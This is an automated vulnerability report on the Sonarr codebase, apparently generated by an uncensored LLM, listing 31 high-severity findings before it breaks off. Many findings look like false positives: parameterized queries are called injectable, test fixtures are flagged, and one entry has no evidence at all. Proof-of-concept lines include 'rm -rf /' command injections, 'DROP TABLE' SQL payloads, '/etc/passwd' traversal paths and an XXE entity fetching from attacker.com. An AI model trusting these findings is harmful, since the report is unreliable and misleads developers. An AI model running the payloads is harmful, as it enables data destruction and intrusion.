# Security Analysis Report

**Repository:** sonarr
**Path:** /Users/rkdavies/git/sonarr
**Date:** 2026-02-24 06:33:36
**Model:** huihui_ai/qwen3-coder-abliterated:30b
**Files Analyzed:** 4677

---

## Summary

**Total Vulnerabilities Found:** 851
- Critical: 0
- High: 106
- Medium: 715
- Low: 16

---

## High Severity Vulnerabilities

### 1. Cross-site Scripting (CWE-79)

**File:** frontend/src/index.ejs
**Line:** 44

**Description:**
The application is vulnerable to Cross-site Scripting (XSS) due to improper sanitization of user input in the HTML template. The URL_BASE variable is directly inserted into the HTML without proper escaping.

**Evidence:**
```
The template uses '__URL_BASE__' which is directly inserted into the script tag without HTML escaping, and the theme variable is used in JavaScript without proper sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript code that would execute in the context of the user's browser, potentially leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If an attacker can control the URL_BASE parameter to contain JavaScript code like 'javascript:alert(1)', it would be executed when the page loads.

**How to Test:**
1. Set URL_BASE parameter to contain JavaScript code
2. Load the application
3. Observe if the JavaScript code executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_indexejs.py`
---

### 2. Cross-site Scripting (CWE-79)

**File:** frontend/src/login.html
**Line:** 100

**Description:**
The login page is vulnerable to XSS due to direct insertion of user-controlled data into the HTML without proper sanitization.

**Evidence:**
```
The year variable is directly inserted into the HTML without escaping, and the theme variable is used in JavaScript without proper sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript code that would execute in the context of the user's browser, potentially leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If an attacker can control the theme parameter to contain JavaScript code like 'javascript:alert(1)', it would be executed when the page loads.

**How to Test:**
1. Set theme parameter to contain JavaScript code
2. Load the login page
3. Observe if the JavaScript code executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_loginhtml.py`
---

### 3. Improper Authentication (CWE-287)

**File:** frontend/src/login.html
**Line:** 50

**Description:**
The login form lacks proper authentication mechanisms and doesn't implement secure password handling.

**Evidence:**
```
The login form uses simple POST without CSRF protection, password strength validation, or secure credential handling.
```

**Impact:**
The application is vulnerable to credential stuffing, brute force attacks, and session hijacking.

**Proof of Concept:**
An attacker could easily submit login requests without proper CSRF tokens or implement brute force attacks.

**How to Test:**
1. Monitor login requests for CSRF tokens
2. Test password strength validation
3. Check session management

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_frontend_src_loginhtml.py`
---

### 4. Missing Authentication for Critical Function (CWE-306)

**File:** frontend/src/index.ts
**Line:** 10

**Description:**
The application's initialization process doesn't validate authentication status before processing the initialize.json response.

**Evidence:**
```
The initialize.json endpoint is called without checking if the user is authenticated.
```

**Impact:**
Unauthenticated users could potentially access sensitive initialization data or manipulate application state.

**Proof of Concept:**
An attacker could access initialize.json endpoint directly without authentication.

**How to Test:**
1. Access initialize.json endpoint without authentication
2. Check if sensitive data is exposed
3. Verify if the application handles unauthenticated access properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-306_frontend_src_indexts.py`
---

### 5. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/CustomFormats/CustomFormats/ImportCustomFormatModalContent.tsx
**Line:** 152

**Description:**
The application parses JSON input from users without proper sanitization, potentially allowing XSS attacks when displaying parsed data.

**Evidence:**
```
The JSON.parse() function is used to parse user input without sanitizing the output before rendering. The parseFields function processes user-provided fields without escaping special characters.
```

**Impact:**
An attacker could inject malicious JavaScript code into custom format specifications that would execute in the context of the authenticated user's browser, potentially leading to session hijacking or data exfiltration.

**Proof of Concept:**
An attacker could create a custom format JSON with malicious script tags in field names or values. When imported, these scripts would execute in the user's browser context, potentially stealing session cookies or performing unauthorized actions.

**How to Test:**
1. Create a custom format JSON with XSS payload in field names or values
2. Import the format through the ImportCustomFormatModal
3. Observe if the payload executes in the browser console or affects UI behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_CustomFormats_CustomFormats_ImportCustomFormatModalContenttsx.py`
---

### 6. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The code uses Path.Combine without proper validation of input paths, potentially allowing path traversal attacks when handling file operations.

**Evidence:**
```
The code uses Path.Combine() and Path.GetDirectoryName() functions directly on user-provided paths without validating that they stay within expected directories. In tests, paths like _sourcePath and _targetPath are constructed using Path.Combine() without checking for directory traversal sequences.
```

**Impact:**
An attacker could potentially manipulate file paths to access or modify files outside of intended directories, leading to unauthorized file access, data leakage, or even remote code execution through file inclusion vulnerabilities.

**Proof of Concept:**
If a path like '../../../../etc/passwd' was passed to TransferFile, it could potentially access files outside the intended directory structure, especially when combined with operations like MoveFile or CopyFile.

**How to Test:**
Test with paths containing '..' sequences and verify that the system properly validates and restricts access to directories. Check that all file operations validate that paths don't escape the intended directory boundaries.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 7. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/Sonarr.Http/Authentication/ApiKeyAuthenticationHandler.cs
**Line:** 45

**Description:**
The API key is stored in memory and potentially logged in cleartext, making it vulnerable to exposure through logs or memory dumps.

**Evidence:**
```
The _apiKey field is stored in memory and used for authentication without any encryption or obfuscation. The authentication handler doesn't mask or encrypt the API key during processing.
```

**Impact:**
An attacker with access to logs or memory dumps can extract the API key and gain unauthorized access to the Sonarr API. This allows full control over the application's functionality.

**Proof of Concept:**
An attacker can extract the API key from logs by searching for API key patterns or by analyzing memory dumps of the running Sonarr process. The key is stored in plain text in the _apiKey field.

**How to Test:**
1. Enable detailed logging in Sonarr
2. Make API requests with API key
3. Check log files for cleartext API key exposure
4. Analyze memory dumps for API key presence

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrHttp_Authentication_ApiKeyAuthenticationHandlercs.py`
---

### 8. Improper Authentication (CWE-287)

**File:** src/Sonarr.Http/Authentication/UiAuthorizationHandler.cs
**Line:** 25

**Description:**
The authentication bypass logic for local addresses may be insufficient, potentially allowing unauthorized access from local networks.

**Evidence:**
```
The code checks for local addresses but doesn't validate the trustworthiness of the IP address source. The TrustCgnatIpAddresses flag is used but not validated for proper configuration.
```

**Impact:**
Unauthorized users on local networks could potentially bypass authentication, especially if CGNAT addresses are trusted without proper validation.

**Proof of Concept:**
An attacker on the local network could send requests with spoofed IP addresses that are treated as local addresses, bypassing authentication requirements.

**How to Test:**
1. Configure Sonarr with AuthenticationRequiredType.DisabledForLocalAddresses
2. Send API requests from non-local IP addresses that might be treated as local
3. Verify authentication bypass occurs for trusted CGNAT addresses
4. Test with spoofed local IP addresses

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_SonarrHttp_Authentication_UiAuthorizationHandlercs.py`
---

### 9. Missing Authentication Check (CWE-306)

**File:** src/Sonarr.Http/Authentication/AuthenticationService.cs
**Line:** 35

**Description:**
The authentication service doesn't properly validate authentication method before attempting login, potentially allowing authentication bypass.

**Evidence:**
```
The Login method checks AUTH_METHOD == AuthenticationType.None but doesn't validate that the authentication method is properly configured or that authentication is actually required.
```

**Impact:**
If authentication is misconfigured or disabled, users might be able to bypass authentication entirely, leading to unauthorized access to protected resources.

**Proof of Concept:**
If the authentication method is set to None but authentication is still required, the system might not properly enforce authentication checks, allowing access to protected endpoints.

**How to Test:**
1. Set authentication method to None in configuration
2. Attempt to access protected endpoints
3. Verify that authentication is properly bypassed
4. Test with different authentication method combinations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-306_src_SonarrHttp_Authentication_AuthenticationServicecs.py`
---

### 10. Command Injection (CWE-77)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 150

**Description:**
The Start method in ProcessProvider allows command execution with user-provided input that is not properly sanitized, potentially leading to command injection vulnerabilities.

**Evidence:**
```
The Start method accepts path and args parameters that are directly used in ProcessStartInfo without proper validation or sanitization. The GetPathAndArgs method also processes paths with extensions (.bat, .ps1, .py) which could be manipulated.
```

**Impact:**
An attacker could inject malicious commands through process paths or arguments, potentially executing arbitrary code with the privileges of the Sonarr process.

**Proof of Concept:**
If an attacker can control the path parameter to Start() method, they could pass a path like "/tmp/malicious_script.bat; rm -rf /" which would execute the malicious script and then delete the entire filesystem.

**How to Test:**
1. Create a test scenario where path parameter can be controlled by user input
2. Pass a path with semicolon or other command separators
3. Verify if commands are executed in sequence
4. Check if process execution bypasses input validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 11. Command Injection (CWE-77)

**File:** src/NzbDrone.Common/Http/HttpUri.cs
**Line:** 105

**Description:**
The HttpUri class uses a regex pattern to parse URIs, but the parsing logic doesn't properly validate or sanitize input before constructing URIs, potentially allowing command injection through crafted URI components.

**Evidence:**
```
The Parse() method uses Uri.TryCreate() and regex matching but doesn't validate the parsed components against potential injection vectors. The CombinePath method doesn't validate input parameters.
```

**Impact:**
An attacker could craft a malicious URI that, when processed, leads to command execution or path traversal vulnerabilities in downstream components that use these URIs.

**Proof of Concept:**
If a URI contains specially crafted path components that are later used in file operations, an attacker could inject commands through path traversal or shell command execution.

**How to Test:**
Test with URIs containing special characters, path traversal sequences, and command injection payloads in various URI components (path, query, fragment).

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommon_Http_HttpUrics.py`
---

### 12. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Common/Disk/OsPath.cs
**Line:** 107

**Description:**
The OsPath class handles path operations but doesn't properly validate or sanitize paths, potentially allowing path traversal attacks when combining paths.

**Evidence:**
```
The OsPath class allows path construction through operators like + and handles different path kinds (Windows/Unix) but doesn't validate input paths for traversal sequences like '../' or '..\'. The operator+ method doesn't validate the resulting path for dangerous sequences.
```

**Impact:**
An attacker could manipulate file paths to access files outside of intended directories, potentially leading to information disclosure, arbitrary file read/write, or even code execution if combined with other vulnerabilities.

**Proof of Concept:**
If an attacker can control path inputs to OsPath operations, they could construct paths like "../../../etc/passwd" that would traverse outside intended directories when combined with other paths.

**How to Test:**
Test path operations with inputs containing traversal sequences like '../', '..\', or multiple consecutive path separators. Verify that paths are properly validated and sanitized before being used in file operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommon_Disk_OsPathcs.py`
---

### 13. Improper Neutralization of Special Elements used in an OS Command (CWE-78)

**File:** src/NzbDrone.Core.Test/UpdateTests/UpdateServiceFixture.cs
**Line:** 109

**Description:**
The code uses string interpolation to build command arguments for starting processes, but doesn't properly sanitize inputs that could contain shell metacharacters. The update mechanism supports script execution which could be vulnerable to command injection.

**Evidence:**
```
The code uses ProcessProvider.Start() with string arguments that could contain user-controlled data, particularly in the script execution path where UpdateScriptPath is used without proper validation or escaping.
```

**Impact:**
An attacker could inject malicious commands into update scripts or command-line arguments, potentially leading to arbitrary code execution with the privileges of the Sonarr process.

**Proof of Concept:**
If an attacker can control the UpdateScriptPath configuration, they could set it to a path like "/tmp/malicious_script.sh; rm -rf /tmp/" which would execute additional commands during the update process.

**How to Test:**
1. Set UpdateMechanism to Script in configuration
2. Set UpdateScriptPath to a path containing shell metacharacters
3. Execute an update command
4. Verify if additional commands are executed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-78_src_NzbDroneCoreTest_UpdateTests_UpdateServiceFixturecs.py`
---

### 14. Weak Password Management (CWE-259)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/UsenetDownloadStationFixture.cs
**Line:** 45

**Description:**
Hardcoded credentials in test files, including username and password for DownloadStation client

**Evidence:**
```
Password = "pass" and Username = "admin" are hardcoded in test setup
```

**Impact:**
If these credentials are used in production, attackers could gain access to DownloadStation services

**Proof of Concept:**
In the test setup, the DownloadStationSettings are configured with hardcoded credentials: Password = "pass" and Username = "admin". If these values are not properly overridden in production, they could be used directly by the application.

**How to Test:**
Search for hardcoded credentials in all configuration files and test fixtures. Verify that production code properly handles credential management and doesn't use hardcoded values.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-259_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_UsenetDownloadStation.py`
---

### 15. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/NzbIndex/Feed.xml
**Line:** 1

**Description:**
The RSS feed contains XML data that could be vulnerable to XXE injection. The feed includes various XML elements with potentially untrusted data sources, particularly in the 'description' and 'title' fields of each item.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_NzbIndex_Feedxml.py`
---

### 16. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core.Test/MediaFiles/DiskScanServiceTests/ScanFixture.cs
**Line:** 105

**Description:**
The code uses path manipulation with AsOsAgnostic() but doesn't validate or sanitize paths before using them in file system operations, potentially allowing path traversal attacks.

**Evidence:**
```
The code uses Path.Combine() and AsOsAgnostic() for path construction but doesn't validate input paths against expected patterns or sanitize them before use in disk operations.
```

**Impact:**
An attacker could potentially manipulate file paths to access files outside of intended directories, leading to information disclosure or unauthorized file access.

**Proof of Concept:**
If a malicious user can control the series path or root folder path, they could inject '../' sequences to traverse directories. For example, if _series.Path = '/var/sonarr/../../../../etc/passwd', the system might process files outside the intended directory structure.

**How to Test:**
1. Create a test case where series path contains path traversal sequences like '../' or '..\' 2. Verify that disk operations don't properly sanitize these paths 3. Test with various OS-specific path separators

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_MediaFiles_DiskScanServiceTests_ScanFixturecs.py`
---

### 17. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Indexers/TorrentRss/TorrentRssIndexerRequestGenerator.cs
**Line:** 35

**Description:**
The cookie parsing in TorrentRssIndexerRequestGenerator does not properly validate or sanitize cookie values, potentially allowing command injection through specially crafted cookie values.

**Evidence:**
```
The code uses HttpHeader.ParseCookies(Settings.Cookie) to parse cookies without additional validation or sanitization of cookie values before setting them in the request.
```

**Impact:**
An attacker could inject commands through malicious cookie values, potentially leading to arbitrary code execution on the server or data exfiltration.

**Proof of Concept:**
If an attacker can control the Cookie setting in TorrentRssIndexerSettings, they could set a cookie value like 'sessionid=abc; path=/; domain=example.com; HttpOnly; Secure; SameSite=Strict; ; /bin/bash -c "echo malicious > /tmp/attack"' which could be executed during request processing.

**How to Test:**
1. Create a Torrent RSS indexer with a malicious cookie value containing shell commands
2. Verify that the cookie values are properly sanitized before being used in HTTP requests
3. Test with various cookie formats to see if command injection is possible

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Indexers_TorrentRss_TorrentRssIndexerRequestGeneratorcs.py`
---

### 18. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabCapabilitiesProvider.cs
**Line:** 104

**Description:**
The application parses XML responses from Newznab indexers without proper input validation, potentially allowing XML External Entity (XXE) injection attacks. The ParseCapabilities method uses XDocument.Parse() directly on untrusted input without disabling external entity resolution.

**Evidence:**
```
The ParseCapabilities method in NewznabCapabilitiesProvider.cs uses XDocument.Parse(response.Content) without setting XmlReaderSettings to disable external entity resolution, making it vulnerable to XXE attacks.
```

**Impact:**
An attacker could craft a malicious indexer response with external entity references that could lead to file disclosure, command execution, or denial of service when Sonarr processes indexer capabilities.

**Proof of Concept:**
An attacker could create a Newznab indexer that returns XML with external entity references like <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil.txt"> ]><caps><limits default="100" max="1000"/></caps> which could cause Sonarr to fetch content from the attacker's server.

**How to Test:**
1. Create a custom indexer with a malicious XML response containing XXE entities
2. Configure Sonarr to use this indexer
3. Trigger indexer capabilities fetching
4. Monitor for external entity resolution attempts

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_Indexers_Newznab_NewznabCapabilitiesProvidercs.py`
---

### 19. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Housekeeping/Housekeepers/CleanupUnusedTags.cs
**Line:** 54

**Description:**
The CleanupUnusedTags housekeeper constructs SQL queries using string concatenation without proper parameterization, leading to potential SQL injection vulnerabilities.

**Evidence:**
```
The code constructs DELETE statements using string interpolation: $"DELETE FROM \"Tags\" WHERE NOT \"Id\" = ANY (\'{usedTagsList}\'::int[])" and $"DELETE FROM \"Tags\" WHERE NOT \"Id\" IN ({usedTagsList})". The usedTagsList is built from user-provided data without proper sanitization.
```

**Impact:**
An attacker could potentially inject malicious SQL into the Tags table deletion queries, allowing for data manipulation, data leakage, or even arbitrary code execution through database operations.

**Proof of Concept:**
If the usedTagsList contains malicious SQL fragments (e.g., '1,2,3; DROP TABLE Tags; --'), the constructed query would execute the DROP TABLE command along with the intended deletion.

**How to Test:**
1. Create a scenario where user input affects the tag IDs in the CleanupUnusedTags process
2. Monitor database queries for injection patterns
3. Test with SQL injection payloads in tag-related data

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Housekeeping_Housekeepers_CleanupUnusedTagscs.py`
---

### 20. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Update/InstallUpdateService.cs
**Line:** 214

**Description:**
The InstallUpdateService uses user-provided update script paths without proper validation, leading to potential command injection vulnerabilities.

**Evidence:**
```
The code uses _configFileProvider.UpdateScriptPath directly in Process.Start() without sanitization: _processProvider.Start(scriptPath, GetUpdaterArgs(updateSandboxFolder)) where scriptPath comes from user configuration.
```

**Impact:**
An attacker with write access to configuration could inject malicious commands into the update script path, potentially executing arbitrary code with the privileges of the Sonarr process.

**Proof of Concept:**
Set UpdateScriptPath to "/bin/bash -c 'echo malicious > /tmp/attack; ls -la /tmp/attack'" and trigger an update to execute the malicious command.

**How to Test:**
1. Set UpdateScriptPath to include shell commands
2. Trigger an update process
3. Verify if commands execute as expected
4. Check for privilege escalation opportunities

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Update_InstallUpdateServicecs.py`
---

### 21. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Organizer/FileNameSampleService.cs
**Line:** 107

**Description:**
The FileNameSampleService creates hardcoded sample data including series titles with special characters that could be exploited in command injection scenarios when these samples are used in file operations.

**Evidence:**
```
Series titles contain special characters like 'The Series Title's!' with apostrophes that could be exploited in shell commands when samples are used for file operations.
```

**Impact:**
If the sample generation is used in shell command execution contexts, attackers could inject commands through specially crafted naming patterns that include the hardcoded sample data.

**Proof of Concept:**
If a naming pattern includes the hardcoded series title 'The Series Title's!' and this is used in a shell command, an attacker could inject commands through the apostrophe character in the title.

**How to Test:**
Test if any naming patterns that use the hardcoded sample data are passed to shell commands or file operations that could be vulnerable to command injection.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Organizer_FileNameSampleServicecs.py`
---

### 22. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method uses Path.GetFileNameWithoutExtension which can be manipulated by external input, potentially leading to format string vulnerabilities when processing subtitle files.

**Evidence:**
```
The method uses Path.GetFileNameWithoutExtension(fileName) without validating or sanitizing the fileName parameter before processing it.
```

**Impact:**
An attacker could manipulate the filename to cause unexpected behavior or potentially lead to command injection through the processing of subtitle files.

**Proof of Concept:**
An attacker could create a subtitle file with a specially crafted filename like '../../../../etc/passwd' to potentially cause path traversal or command injection when the filename is processed.

**How to Test:**
Test with various special characters in filename, try path traversal sequences, and verify if the processing handles malformed inputs correctly.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 23. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The code uses string formatting with externally controlled input in multiple Logger.Debug and Logger.Error calls without proper validation, potentially leading to format string vulnerabilities.

**Evidence:**
```
Multiple instances of Logger.Debug and Logger.Error calls with format strings that could be controlled by external input, such as 'Parsing string '{0}'', 'An error has occurred while trying to parse {0}', 'Episode parsed from file and folder names. {0}', etc.
```

**Impact:**
An attacker could potentially inject format specifiers into log messages, leading to information disclosure or potential code execution if the logging system supports format string expansion.

**Proof of Concept:**
If an attacker can control the title parameter passed to ParseTitle() and it contains format specifiers like '%s', '%d', etc., these could be interpreted by the logging system, potentially revealing internal memory contents or causing unexpected behavior.

**How to Test:**
Test with titles containing format specifiers like 'Test%s', 'Test%d', 'Test%n%n%n', etc. Verify that these are properly escaped in log output and not interpreted as format specifiers.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Parser_Parsercs.py`
---

### 24. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Tv/MoveSeriesService.cs
**Line:** 55

**Description:**
The MoveSeriesService uses user-provided paths without proper validation or sanitization, potentially leading to command injection vulnerabilities when moving series directories.

**Evidence:**
```
The MoveSingleSeries method accepts sourcePath and destinationPath parameters directly from command messages without validating or sanitizing them before using them in file system operations.
```

**Impact:**
An attacker could manipulate the source or destination paths to execute arbitrary commands or access unauthorized directories through path traversal or command injection.

**Proof of Concept:**
An attacker could send a MoveSeriesCommand with sourcePath = '../../../../etc/passwd' or destinationPath = '; rm -rf /' to potentially execute commands or access sensitive files.

**How to Test:**
1. Send a MoveSeriesCommand with malicious paths containing special characters like ';', '&', '|', or '../'
2. Monitor if the system attempts to move files to unexpected locations
3. Check if the system handles paths with special shell characters properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Tv_MoveSeriesServicecs.py`
---

### 25. Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') (CWE-89)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 110

**Description:**
The Count() method constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
Line 110: return conn.ExecuteScalar<int>($"SELECT COUNT(*) FROM \"{_table}\""); - The table name is directly inserted into the SQL query without parameterization.
```

**Impact:**
An attacker could inject malicious SQL into the table name, potentially allowing full database access, data exfiltration, or even command execution through database features.

**Proof of Concept:**
If a malicious user can control the table name through configuration or input, they could inject SQL like: "series'; DROP TABLE series; --" which would result in: "SELECT COUNT(*) FROM \"series'; DROP TABLE series; --\"".

**How to Test:**
1. Try to inject SQL into table names through configuration or API endpoints that use dynamic table names. 2. Monitor database logs for unexpected SQL queries. 3. Test with special characters in table names.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 26. Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') (CWE-89)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 254

**Description:**
The GetPagedRecords method constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
Line 254: builder.OrderBy($"\"{sortKey.Table ?? _table}\".\"{sortKey.Column}\" {sortDirection} LIMIT {pagingSpec.PageSize} OFFSET {pagingOffset}"); - The table and column names are directly inserted into the SQL query without parameterization.
```

**Impact:**
An attacker could inject malicious SQL into the sort key or table name, potentially allowing full database access, data exfiltration, or even command execution through database features.

**Proof of Concept:**
If a malicious user can control the sort key through API parameters, they could inject SQL like: "series'; DROP TABLE series; --" which would result in: "ORDER BY \"series'; DROP TABLE series; --\".\"id\" ASC LIMIT 10 OFFSET 0".

**How to Test:**
1. Test API endpoints that accept sort parameters with malicious inputs. 2. Monitor database logs for unexpected SQL queries. 3. Try injecting SQL into sort key parameters.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 27. Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') (CWE-89)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 281

**Description:**
The GetPagedRecordCount method constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
Line 281: return conn.ExecuteScalar<int>(sql.RawSql, sql.Parameters); - The SQL query is built with string concatenation and may contain unescaped table/column names.
```

**Impact:**
An attacker could inject malicious SQL into the count query, potentially allowing full database access, data exfiltration, or even command execution through database features.

**Proof of Concept:**
If the SQL template construction allows injection in table/column names, an attacker could inject SQL that modifies the count query to return unexpected results or execute additional commands.

**How to Test:**
1. Test API endpoints that use paging with various sort parameters. 2. Monitor database logs for unexpected SQL queries. 3. Try injecting SQL into filter expressions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 28. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/146_cleanup_duplicates_updatehistory.cs
**Line:** 35

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'DELETE FROM "UpdateHistory" WHERE "Id" IN ({ids})' where ids is constructed from toDelete.Select(v => v.ToString()).Join(", ")
```

**Impact:**
An attacker could inject malicious SQL into the 'ids' parameter, potentially allowing them to delete arbitrary records from the UpdateHistory table or execute other database operations.

**Proof of Concept:**
If toDelete contains malicious input like '1, 2; DROP TABLE UpdateHistory; --', the resulting SQL would be: 'DELETE FROM "UpdateHistory" WHERE "Id" IN (1, 2; DROP TABLE UpdateHistory; --)'

**How to Test:**
1. Create a scenario where user input can influence the toDelete list
2. Inject SQL payload into the IDs
3. Verify that the injected SQL executes successfully
4. Check if additional database operations can be performed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_146_cleanup_duplicates_updatehistorycs.py`
---

### 29. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/099_extra_and_subtitle_files.cs
**Line:** 70

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "MetadataFiles" SET "Extension" = @Extension WHERE "Id" = @Id' but the updateSql variable is constructed using string interpolation instead of proper parameterization
```

**Impact:**
An attacker could inject malicious SQL into the updateSql construction, potentially allowing them to modify arbitrary records in the MetadataFiles table.

**Proof of Concept:**
If the extension value contains SQL injection payload, it could affect the update operation or even allow additional SQL execution.

**How to Test:**
1. Test with malicious extension values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_099_extra_and_subtitle_filescs.py`
---

### 30. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/103_fix_metadata_file_extensions.cs
**Line:** 40

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "MetadataFiles" SET "Extension" = @Extension WHERE "Id" = @Id' but the updateSql variable is constructed using string interpolation instead of proper parameterization
```

**Impact:**
An attacker could inject malicious SQL into the updateSql construction, potentially allowing them to modify arbitrary records in the MetadataFiles table.

**Proof of Concept:**
If the extension value contains SQL injection payload, it could affect the update operation or even allow additional SQL execution.

**How to Test:**
1. Test with malicious extension values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_103_fix_metadata_file_extensionscs.py`
---

### 31. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/162_release_profile_to_array.cs
**Line:** 45

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "ReleaseProfiles" SET "Required" = ?, "Ignored" = ? WHERE "Id" = ?' but the parameters are not properly validated or escaped
```

**Impact:**
